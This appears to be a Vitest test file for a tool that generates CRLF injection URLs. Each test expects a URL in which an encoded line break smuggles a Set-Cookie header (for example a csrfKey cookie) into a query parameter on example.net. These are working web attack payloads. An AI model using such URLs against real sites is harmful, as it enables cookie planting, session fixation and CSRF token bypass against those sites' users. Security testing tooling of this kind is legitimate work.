import { describe, it, expect } from 'vitest';
import { buildCookieInjectionUrl } from '../../lib/generator/urlBuilder';

describe('CRLF Cookie Injection URL Builder', () => {
  it('appends CRLF injection to an existing search query URL', () => {
    const url = buildCookieInjectionUrl({
      rawUrl: 'https://example.net/?search=Hello+World',
      cookieName: 'csrfKey',
      cookieValue: 'SECRET123',
      sameSite: 'None',
    });

    expect(url).toBe(
      'https://example.net/?search=Hello+World%0d%0aSet-Cookie:%20csrfKey=SECRET123%3b%20SameSite=None'
    );
  });

  it('constructs search parameter if URL has no query string', () => {
    const url = buildCookieInjectionUrl({
      rawUrl: 'https://example.net/search',
      cookieName: 'csrfKey',
      cookieValue: 'ABC999',
      sameSite: 'None',
    });

    expect(url).toBe(
      'https://example.net/search?search=test%0d%0aSet-Cookie:%20csrfKey=ABC999%3b%20SameSite=None'
    );
  });

  it('allows custom parameter name if specified', () => {
    const url = buildCookieInjectionUrl({
      rawUrl: 'https://example.net/lookup',
      cookieName: 'session_tracker',
      cookieValue: 'xyz',
      customParam: 'user',
      sameSite: 'Lax',
    });

    expect(url).toBe(
      'https://example.net/lookup?user=test%0d%0aSet-Cookie:%20session_tracker=xyz%3b%20SameSite=Lax'
    );
  });

  it('omits SameSite flag when sameSite is none', () => {
    const url = buildCookieInjectionUrl({
      rawUrl: 'https://example.net/?q=query',
      cookieName: 'token',
      cookieValue: '123',
      sameSite: 'none',
    });

    expect(url).toBe('https://example.net/?q=query%0d%0aSet-Cookie:%20token=123');
  });

  it('returns empty string when rawUrl is blank', () => {
    const url = buildCookieInjectionUrl({
      rawUrl: '   ',
      cookieName: 'csrfKey',
      cookieValue: '123',
    });

    expect(url).toBe('');
  });
});
